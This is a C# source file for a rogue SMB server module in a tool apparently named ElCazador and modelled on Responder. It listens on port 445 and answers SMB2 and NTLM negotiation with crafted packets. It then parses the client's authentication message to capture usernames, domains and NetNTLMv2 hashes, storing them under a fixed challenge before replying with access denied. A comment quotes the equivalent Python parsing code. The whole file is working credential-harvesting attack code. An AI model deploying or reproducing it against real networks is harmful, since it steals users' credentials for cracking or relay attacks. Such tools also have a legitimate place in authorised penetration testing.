using System;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using ElCazador.Worker.Models;
using ElCazador.Worker.Modules.Servers.Models;
using ElCazador.Worker.Utils;

namespace ElCazador.Worker.Modules.Servers
{
    internal class SMBServer : IModule
    {
        private static ManualResetEvent mre = new ManualResetEvent(false);
        private Socket Socket { get; set; }
        public bool IsEnabled => true;


        public void Run()
        {
            StartSocket();
        }

        private void StartSocket()
        {
            // Data buffer for incoming data.  
            byte[] bytes = new Byte[1024];
            IPEndPoint localEndPoint = new IPEndPoint(Worker.IP, 445);

            // Create a TCP/IP socket.  
            Socket listener = new Socket(localEndPoint.Address.AddressFamily,
                SocketType.Stream, ProtocolType.Tcp);

            // Bind the socket to the local endpoint and listen for incoming connections.  
            try
            {
                listener.Bind(localEndPoint);
                listener.Listen(100);

                while (true)
                {
                    // Set the event to nonsignaled state.  
                    mre.Reset();

                    // Start an asynchronous socket to listen for connections.  
                    listener.BeginAccept(
                        new AsyncCallback(AcceptCallback),
                        listener);

                    // Wait until a connection is made before continuing.  
                    mre.WaitOne();
                }

            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }

        private void AcceptCallback(IAsyncResult ar)
        {
            // Signal the main thread to continue.  
            mre.Set();

            // Get the socket that handles the client request.  
            Socket listener = (Socket)ar.AsyncState;
            Socket handler = listener.EndAccept(ar);

            // Create the state object.  
            SMBPacket state = new SMBPacket();
            state.Socket = handler;
            handler.BeginReceive(state.Buffer, 0, SMBPacket.BUFFER_SIZE, 0,
                new AsyncCallback(ReadCallback), state);
        }

        private void ReadCallback(IAsyncResult ar)
        {
            // Retrieve the state object and the handler socket  
            // from the asynchronous state object.  
            SMBPacket state = (SMBPacket)ar.AsyncState;
            Socket handler = state.Socket;

            // Read data from the client socket.   
            int bytesRead = 1;//handler.EndReceive(ar);

            if (bytesRead > 0)
            {
                if (state.Buffer[8].Equals(SMB2Commands.SMB1NegotiateToSMB2))
                {
                    NegotiateSMB1ToSMB2Response(state);
                }
                else if (state.Command.SequenceEqual(SMB2Commands.Request))
                {
                    NegotiateResponse(state);
                }
                else if (state.Command.SequenceEqual(SMB2Commands.NegotiateNTLM) && state.MessageID.SequenceEqual(new byte[] { 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }))
                {
                    NegotiateNTLMResponse(state);
                }
                else if (state.Command.SequenceEqual(SMB2Commands.NegotiateNTLM) && state.MessageID.SequenceEqual(new byte[] { 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }))
                {
                    ParseHash(state);
                    SendAccessDenied(state);

                    if (handler.Connected)
                    {
                        handler.EndReceive(ar);
                        handler.Shutdown(SocketShutdown.Both);
                    }

                    return;
                }

                handler.BeginReceive(state.Buffer, 0, SMBPacket.BUFFER_SIZE, 0,
                    new AsyncCallback(ReadCallback), state);
            }
        }

        /*
                SSPIStart = data[113:]
    data = data[113:]
    LMhashLen = struct.unpack('<H',data[12:14])[0]
    LMhashOffset = struct.unpack('<H',data[16:18])[0]
    LMHash = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
    NthashLen = struct.unpack('<H',data[22:24])[0]
    NthashOffset = struct.unpack('<H',data[24:26])[0]
    SMBHash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
    DomainLen = struct.unpack('<H',data[30:32])[0]
    DomainOffset = struct.unpack('<H',data[32:34])[0]
    Domain = SSPIStart[DomainOffset:DomainOffset+DomainLen].decode('UTF-16LE')
    UserLen      = struct.unpack('<H',data[38:40])[0]
    UserOffset   = struct.unpack('<H',data[40:42])[0]
    Username     = SSPIStart[UserOffset:UserOffset+UserLen].decode('UTF-16LE')
    WriteHash    = '%s::%s:%s:%s:%s' % (Username, Domain, settings.Config.NumChal, SMBHash[:32], SMBHash[32:])
    SaveToDb({
                'module': 'SMBv2', 
		'type': 'NTLMv2-SSP', 
		'client': client, 
		'user': Domain+'\\'+Username, 
		'hash': SMBHash, 
		'fullhash': WriteHash,
             })
         */
        private void ParseHash(SMBPacket packet)
        {
            var auth = packet.Buffer.Skip(113).ToArray();

            short lmHashLen = BitConverter.ToInt16(auth, 12);
            short lmHashOffset = BitConverter.ToInt16(auth, 16);
            var lmHash = BitConverter.ToString(auth.Skip(lmHashOffset).Take(lmHashLen).ToArray()).Replace("-", "");

            var ntHashLen = BitConverter.ToInt16(auth, 22);
            short ntHashOffset = BitConverter.ToInt16(auth, 24); ;
            var ntHash = BitConverter.ToString(auth.Skip(ntHashOffset).Take(ntHashLen).ToArray()).Replace("-", "");

            short domainLen = BitConverter.ToInt16(auth, 30);
            short domainOffset = BitConverter.ToInt16(auth, 32);
            string domain = Encoding.Unicode.GetString(auth.Skip(domainOffset).Take(domainLen).ToArray());

            short userLen = BitConverter.ToInt16(auth, 38);
            short userOffset = BitConverter.ToInt16(auth, 40);
            string user = Encoding.Unicode.GetString(auth.Skip(userOffset).Take(userLen).ToArray());

            Worker.AddHash(new Hash
            {
                IPAddress = (packet.Socket.RemoteEndPoint as IPEndPoint).Address,
                User = user,
                Domain = domain,
                Challenge = "7466dcf96c9be6c8",
                NetLMHash = String.Concat(ntHash.Take(32)),
                NetNTHash = string.Concat(ntHash.Skip(32))
            });
        }


        private void NegotiateSMB1ToSMB2Response(SMBPacket packet)
        {
            var header = new SMB2Header(new byte[] { 0x00, 0x00 });

            var data = new SMB2NegotiateResponse(header.Build()).Build();

            Send(packet.Socket, data);
        }

        private void NegotiateResponse(SMBPacket packet)
        {
            var header = new SMB2Header(
                new byte[] { 0x00, 0x00 },
                packet.MessageID,
                packet.CreditCharge,
                packet.Credits,
                packet.ProcessID
                );

            var data = new SMB2NegotiateResponse(
                header.Build(),
                new byte[] { 0x10, 0x02 }).Build();

            Send(packet.Socket, data);
        }

        // head = SMB2Header(Cmd="\x01\x00", MessageId=GrabMessageID(data), PID="\xff\xfe\x00\x00", CreditCharge=GrabCreditCharged(data), Credits=GrabCreditRequested(data), SessionID=GrabSessionID(data),NTStatus="\x16\x00\x00\xc0")
        private void NegotiateNTLMResponse(SMBPacket packet)
        {
            var header = new SMB2Header(
                new byte[] { 0x01, 0x00 },
                packet.MessageID,
                packet.CreditCharge,
                packet.Credits,
                new byte[] { 0xff, 0xfe, 0x00, 0x00 },
                packet.SessionID,
                new byte[] { 0x16, 0x00, 0x00, 0xc0 }
            );

            var data = new SMB2NTLMNegotiate(header.Build()).Build();

            Send(packet.Socket, data);
        }

        private void SendAccessDenied(SMBPacket packet)
        {
            var header = new SMB2Header(
                new byte[] { 0x01, 0x00 },
                packet.MessageID,
                packet.CreditCharge,
                packet.Credits,
                new byte[] { 0xff, 0xfe, 0x00, 0x00 },
                packet.SessionID,
                new byte[] { 0x22, 0x00, 0x00, 0xc0 }
            );

            var data = new SMB2AccessDenied(header.Build()).Build();

            Send(packet.Socket, data);
        }

        private void Send(Socket handler, byte[] data)
        {
            //TODO: At some point in life figure out why it is trying to send another packet here after the last one.

            // TODO: THIS IS SHIT! Do something elsero pleaso
            data = ByteUtils.IntToBigEndian(data.Length).Concat(data).ToArray();

            // Begin sending the data to the remote device.  
            handler.BeginSend(data, 0, data.Length, 0,
                new AsyncCallback(SendCallback), handler);
        }

        private void SendCallback(IAsyncResult ar)
        {
            try
            {
                // Retrieve the socket from the state object.  
                Socket handler = (Socket)ar.AsyncState;

                // Complete sending the data to the remote device.  
                int bytesSent = handler.EndSend(ar);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }
    }
}